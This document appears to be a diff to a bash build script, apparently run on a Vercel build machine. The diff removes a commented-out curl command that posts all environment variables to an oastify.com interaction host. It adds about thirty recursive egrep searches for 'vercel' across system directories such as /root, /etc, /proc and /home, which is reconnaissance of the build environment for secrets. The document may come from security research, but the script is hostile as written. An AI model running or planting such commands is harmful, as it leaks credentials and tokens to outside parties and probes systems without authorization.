@@ -1,3 +1,32 @@
 #!/bin/bash
 
-##curl -X POST -d "$(env)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+egrep -r "vercel" /boot/.
+egrep -r "vercel" /bun1/.
+egrep -r "vercel" /dev/.
+egrep -r "vercel" /etc/.
+egrep -r "vercel" /gitlfs/.
+egrep -r "vercel" /home/.
+egrep -r "vercel" /usr/lib/.
+egrep -r "vercel" /usr/lib64/.
+egrep -r "vercel" /local/.
+egrep -r "vercel" /media/.
+egrep -r "vercel" /mnt/.
+egrep -r "vercel" /node14/.
+egrep -r "vercel" /node16/.
+egrep -r "vercel" /node18/.
+egrep -r "vercel" /opt/.
+egrep -r "vercel" /pnpm7/.
+egrep -r "vercel" /pnpm8/.
+egrep -r "vercel" /proc/.
+egrep -r "vercel" /python39/.
+egrep -r "vercel" /root/.
+egrep -r "vercel" /ruby27/.
+egrep -r "vercel" /ruby32/.
+egrep -r "vercel" /run/.
+egrep -r "vercel" /usr/sbin/.
+egrep -r "vercel" /srv/.
+egrep -r "vercel" /sys/.
+egrep -r "vercel" /tmp/.
+egrep -r "vercel" /usr/.
+egrep -r "vercel" /var/.
+egrep -r "vercel" /vercel/.
